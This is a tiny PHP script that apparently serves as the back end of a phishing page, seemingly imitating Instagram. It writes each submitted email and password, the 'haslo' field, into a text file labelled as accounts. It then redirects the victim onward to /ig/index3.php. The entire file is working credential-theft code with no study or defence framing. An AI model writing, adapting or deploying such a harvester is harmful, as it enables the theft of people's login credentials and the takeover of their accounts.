<?php
file_put_contents("usernamesemail.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['haslo'] .
"\n", FILE_APPEND);
header('Location: /ig/index3.php');
exit();
?>